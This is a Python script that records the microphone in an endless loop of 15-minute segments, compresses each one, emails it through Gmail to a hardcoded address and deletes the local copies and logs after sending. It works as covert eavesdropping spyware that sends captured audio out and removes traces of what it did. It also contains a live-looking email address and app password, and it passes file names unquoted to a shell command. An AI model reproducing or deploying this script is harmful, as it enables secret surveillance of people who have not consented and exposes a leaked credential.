import pyaudio
import wave
import os
import smtplib
import time
from email.message import EmailMessage
from datetime import datetime

# 🛑 Replace with your own credentials (Use App Password instead of real password)
EMAIL_SENDER = "thefallenangel7890@gmail.com"
EMAIL_PASSWORD = "qyuc mnpv pglu ykdx"  # 🔹 Use App Password, NOT your real password
EMAIL_RECEIVER = "thefallenangel7890@gmail.com"

# SMTP Configuration
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# File Storage
FOLDER_PATH = "C:/recordings/"  # Storage location
LOG_FILE = os.path.join(FOLDER_PATH, "log.txt")  # Log file

# Recording Settings
DURATION = 900  # 15 minutes (900 seconds)
BITRATE = "28k"  # 28 kbps bitrate

def create_folder():
    """Ensure the recordings folder exists"""
    if not os.path.exists(FOLDER_PATH):
        os.makedirs(FOLDER_PATH)

def write_log(entry):
    """Write log entries to log file"""
    with open(LOG_FILE, "a") as log:
        log.write(entry + "\n")

def count_logs():
    """Count the number of log entries"""
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as log:
            return len(log.readlines())
    return 0

def get_filename():
    """Generate a filename with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    return os.path.join(FOLDER_PATH, f"{timestamp}.wav")

def record_audio():
    """Record audio from the microphone for 15 minutes"""
    create_folder()
    filename = get_filename()
    
    chunk = 1024  
    sample_format = pyaudio.paInt16  
    channels = 1  
    rate = 44100  
    
    p = pyaudio.PyAudio()
    stream = p.open(format=sample_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
    frames = []

    print(f"🔴 Recording started: {filename}")
    for _ in range(0, int(rate / chunk * DURATION)):
        data = stream.read(chunk)
        frames.append(data)
    
    print(f"✅ Recording saved: {filename}")
    
    stream.stop_stream()
    stream.close()
    p.terminate()
    
    wf = wave.open(filename, 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(sample_format))
    wf.setframerate(rate)
    wf.writeframes(b''.join(frames))
    wf.close()

    write_log(f"{datetime.now()} - Recorded: {filename}")
    return filename

def compress_audio(input_file):
    """Compress WAV to MP3 at 28 kbps using FFmpeg"""
    output_file = input_file.replace(".wav", ".mp3")
    os.system(f"ffmpeg -i {input_file} -b:a {BITRATE} {output_file} -y")
    os.remove(input_file)  # Delete original WAV file

    write_log(f"{datetime.now()} - Compressed to 28 kbps: {output_file}")
    return output_file

def send_email(file_path, subject, body):
    """Send the given file via email and delete it after sending"""
    msg = EmailMessage()
    msg["From"] = EMAIL_SENDER
    msg["To"] = EMAIL_RECEIVER
    msg["Subject"] = subject
    msg.set_content(body)

    with open(file_path, "rb") as file:
        msg.add_attachment(file.read(), maintype="application", subtype="octet-stream", filename=os.path.basename(file_path))
    
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.send_message(msg)

        print(f"✅ Email sent: {file_path}")
        write_log(f"{datetime.now()} - Email sent: {file_path}")
        
        # ✅ Delete the file after sending
        os.remove(file_path)
        print(f"🗑️ File deleted: {file_path}")
    
    except Exception as e:
        print(f"❌ Email failed: {e}")
        write_log(f"{datetime.now()} - Email failed: {str(e)}")

def check_and_send_unsent():
    """Check for unsent recordings and send them"""
    create_folder()
    files = [f for f in os.listdir(FOLDER_PATH) if f.endswith(".mp3")]

    for file in files:
        file_path = os.path.join(FOLDER_PATH, file)
        send_email(file_path, "New Audio Recording", "Attached is the latest 15-minute audio recording.")

def send_log_if_needed():
    """Send log file after 25 log entries"""
    if count_logs() >= 25:
        send_email(LOG_FILE, "Log Report", "Attached is the log file.")
        os.remove(LOG_FILE)  # Delete log after sending

def run_forever():
    """Keep recording and sending audio all day until shutdown"""
    while True:
        check_and_send_unsent()  # Check for unsent files on startup
        new_file = record_audio()  # Record new audio (15 minutes)
        compressed_file = compress_audio(new_file)  # Compress it to 28 kbps
        send_email(compressed_file, "New Audio Recording", "Attached is the latest 15-minute audio recording.")
        send_log_if_needed()  # Send log after 25 entries

if __name__ == "__main__":
    run_forever()  # Runs continuously until shutdown